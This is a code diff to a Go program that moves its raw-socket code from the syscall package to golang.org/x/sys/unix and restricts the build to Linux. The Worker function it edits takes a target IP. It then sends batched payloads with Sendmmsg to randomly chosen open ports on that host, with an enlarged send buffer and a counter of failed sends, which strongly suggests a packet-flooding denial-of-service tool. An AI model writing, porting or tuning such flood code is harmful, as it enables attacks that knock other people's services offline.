@@ -1,3 +1,6 @@
+//go:build linux
+// +build linux
+
 package main
 
 import (
@@ -16,6 +19,8 @@ import (
 	"syscall"
 	"time"
 	"unsafe"
+
+	"golang.org/x/sys/unix"
 )
 
 var (
@@ -311,18 +316,18 @@ func Worker(IPT string) {
 		rawFd = int(fd)
 	})
 	
-	// Set socket options
-	syscall.SetsockoptInt(rawFd, syscall.SOL_SOCKET, syscall.SO_REUSEADDR, 1)
-	syscall.SetsockoptInt(rawFd, syscall.SOL_SOCKET, syscall.SO_REUSEPORT, 1)
-	syscall.SetsockoptInt(rawFd, syscall.SOL_IP, syscall.IP_MTU_DISCOVER, syscall.IP_PMTUDISC_DONT)
-	syscall.SetsockoptInt(rawFd, syscall.SOL_SOCKET, syscall.SO_SNDBUF, 1024*1024)
+	// Set socket options using unix constants
+	unix.SetsockoptInt(rawFd, unix.SOL_SOCKET, unix.SO_REUSEADDR, 1)
+	unix.SetsockoptInt(rawFd, unix.SOL_SOCKET, unix.SO_REUSEPORT, 1)
+	unix.SetsockoptInt(rawFd, unix.SOL_IP, unix.IP_MTU_DISCOVER, unix.IP_PMTUDISC_DONT)
+	unix.SetsockoptInt(rawFd, unix.SOL_SOCKET, unix.SO_SNDBUF, 1024*1024)
 
 	ipBytes := ipToBytes(IPT)
 	
 	// Pre-calculate addresses
-	addrs := make([]syscall.SockaddrInet4, len(openPorts))
+	addrs := make([]unix.SockaddrInet4, len(openPorts))
 	for i, port := range openPorts {
-		addrs[i] = syscall.SockaddrInet4{
+		addrs[i] = unix.SockaddrInet4{
 			Port: port,
 			Addr: ipBytes,
 		}
@@ -343,8 +348,8 @@ func Worker(IPT string) {
 			}
 
 			// Prepare batch
-			msgs := make([]syscall.Mmsghdr, toSend)
-			iovecs := make([]syscall.Iovec, toSend)
+			msgs := make([]unix.Mmsghdr, toSend)
+			iovecs := make([]unix.Iovec, toSend)
 			payloads := make([][]byte, toSend)
 
 			for i := 0; i < toSend; i++ {
@@ -354,14 +359,14 @@ func Worker(IPT string) {
 				}
 				payloads[i] = payload
 
-				iovecs[i] = syscall.Iovec{
+				iovecs[i] = unix.Iovec{
 					Base: &payload[0],
 					Len:  uint64(len(payload)),
 				}
 
 				addr := &addrs[r.Intn(len(addrs))]
-				msgs[i] = syscall.Mmsghdr{
-					Msg_hdr: syscall.Msghdr{
+				msgs[i] = unix.Mmsghdr{
+					MsgHdr: unix.Msghdr{
 						Name:    (*byte)(unsafe.Pointer(addr)),
 						Namelen: uint32(unsafe.Sizeof(*addr)),
 						Iov:     &iovecs[i],
@@ -370,8 +375,8 @@ func Worker(IPT string) {
 				}
 			}
 
-			// Send batch
-			n, err := syscall.Sendmmsg(rawFd, msgs, 0)
+			// Send batch using unix.Sendmmsg
+			n, err := unix.Sendmmsg(rawFd, msgs, 0)
 			if err != nil {
 				GAGAL.Add(uint64(toSend))
 			} else {
